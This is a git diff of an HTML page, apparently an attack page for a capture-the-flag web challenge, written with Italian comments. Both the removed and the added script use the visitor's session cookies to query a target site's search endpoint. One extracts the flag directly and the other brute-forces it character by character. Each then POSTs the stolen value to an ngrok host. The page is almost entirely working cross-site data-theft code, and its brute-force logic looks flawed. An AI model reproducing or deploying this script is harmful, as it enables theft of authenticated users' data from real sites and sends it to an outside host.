@@ -9,43 +9,50 @@
     <h1>Rubare la Flag dell'Architetto</h1>
 
     <script>
-        // Funzione per rubare la flag
-        const stealFlag = () => {
-            fetch('https://matrix-simplified.capturetheflags.site/search?s=flag', {
-                method: 'GET',
-                credentials: 'include', // Include i cookie di sessione
-                mode: 'cors' // Imposta CORS
-            })
-            .then(response => {
-                if (!response.ok) {
-                    // Aggiungi un messaggio di errore dettagliato
-                    throw new Error('Network response was not ok: ' + response.status + ' ' + response.statusText);
-                }
-                return response.text();
-            })
-            .then(data => {
-                const flag = data.match(/flag{.*?}/);
-                if (flag) {
-                    fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                        },
-                        body: `flag=${encodeURIComponent(flag[0])}`
-                    })
-                    .then(response => response.text())
-                    .then(data => console.log(data))
-                    .catch(error => console.error('Errore nella ricezione della flag:', error));
-                } else {
-                    console.log('Nessuna flag trovata nella risposta.');
-                }
-            })
-            .catch(error => console.error('Errore:', error));
+        const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag';
+        const flagLength = 40; // Sostituisci con la lunghezza esatta della flag
+        let currentFlag = '';
+
+        // Funzione per testare i caratteri della flag
+        const testChar = (position) => {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}'; // Caratteri da testare
+            for (let char of chars) {
+                const query = `${baseUrl}${currentFlag}${char}`;
+                fetch(query, {
+                    method: 'GET',
+                    credentials: 'include', // Include i cookie di sessione
+                    mode: 'cors' // Imposta CORS
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log(`Trovato carattere ${char} per la posizione ${position}`);
+                        currentFlag += char; // Aggiungi il carattere trovato
+                        if (currentFlag.length < flagLength) {
+                            testChar(currentFlag.length); // Chiama ricorsivamente per la prossima posizione
+                        } else {
+                            console.log(`Flag completa: ${currentFlag}`);
+                            // Invia la flag al server Flask
+                            fetch('https://1e6b-87-4-142-72.ngrok-free.app/receive_flag', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded',
+                                },
+                                body: `flag=${encodeURIComponent(currentFlag)}`
+                            })
+                            .then(response => response.text())
+                            .then(data => console.log(data))
+                            .catch(error => console.error('Errore:', error));
+                        }
+                    } else {
+                        console.log(`Carattere ${char} non valido per la posizione ${position}`);
+                    }
+                })
+                .catch(error => console.error('Errore:', error));
+            }
         };
 
-
-        // Eseguire automaticamente la funzione al caricamento della pagina
-        window.onload = stealFlag;
+        // Inizia il processo di test dei caratteri
+        testChar(0);
     </script>
 </body>
 </html>
